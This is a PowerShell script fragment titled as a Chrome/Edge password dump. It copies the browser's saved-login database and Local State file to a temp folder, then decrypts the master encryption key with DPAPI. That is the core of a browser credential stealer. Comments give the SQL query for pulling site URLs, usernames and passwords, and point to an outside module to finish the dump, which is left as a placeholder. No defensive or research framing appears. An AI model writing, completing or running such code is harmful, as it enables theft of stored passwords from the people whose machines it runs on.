# ================== CHROME / EDGE (Chromium) Password Dump ==================
function Get-ChromiumPasswords {
    param (
        [string]$BrowserName = "Chrome",
        [string]$BasePath
    )

    $output = "=== $BrowserName Saved Passwords ===`n"
    $loginDataPath = Join-Path $BasePath "Login Data"
    $localStatePath = Join-Path (Split-Path $BasePath) "Local State"

    if (-not (Test-Path $loginDataPath)) {
        $output += "No Login Data file found for $BrowserName.`n"
        return $output
    }

    # Copy files to temp cuz browsers lock them
    $tempLogin = "$env:TEMP\LoginData_$BrowserName"
    $tempState = "$env:TEMP\LocalState_$BrowserName"
    Copy-Item $loginDataPath $tempLogin -Force -ErrorAction SilentlyContinue
    Copy-Item $localStatePath $tempState -Force -ErrorAction SilentlyContinue

    if (-not (Test-Path $tempLogin)) {
        $output += "Failed to copy Login Data for $BrowserName (browser open?).`n"
        return $output
    }

    # Get master key from Local State
    $localState = Get-Content $tempState -Raw | ConvertFrom-Json
    $encKeyB64 = $localState.os_crypt.encrypted_key
    if (-not $encKeyB64) {
        $output += "No encrypted_key found.`n"
        Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
        return $output
    }

    $encKey = [Convert]::FromBase64String($encKeyB64)
    if ([string]::new($encKey[0..4]) -eq 'DPAPI') {
        $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey[5..$encKey.Length], $null, 'CurrentUser')
    } else {
        $output += "Unknown key format.`n"
        Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
        return $output
    }

    # Use built-in SQLite (Win10+ has winsqlite3.dll, but we use System.Data.SQLite if avail; fallback to query via Add-Type hack or just note)
    # For simplicity, assume you have no external DLL → we can't query SQLite pure PS easily without DLL.
    # Better: use [Microsoft.Data.Sqlite] if installed, but most don't have it.
    # Real talk: to make this self-contained without DLL, it's pain. Many scripts load System.Data.SQLite.dll dynamically.
    # For debug: install module Read-Chromium from PSGallery if you want (Install-Module Read-Chromium), then:
    # Import-Module Read-Chromium
    # $creds = Read-Chromium -DbPath $tempLogin
    # But to keep pure: here's a basic structure (you'll need to add SQLite support or use external for full).

    # Placeholder - you need SQLite interop for full dump. Here's the query you'd run:
    # SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0

    # For now, to test decryption logic, we'll assume you grab rows manually or use tool.
    # Full working one-liner style from sources (adapted from James O'Neill's Read-Chromium):

    # If you want full, paste this function from https://jhoneill.github.io/powershell/2020/11/23/Chrome-Passwords.html
    # But to make it work here, run this block after copying files:

    # Quick test: if you have sqlite3.exe or module, but pure PS:
    $output += "Chrome/Edge dump requires SQLite query. Install 'Install-Module -Name Read-Chromium' for easy use.`n"
    $output += "Or use this logic with DLL.`n"

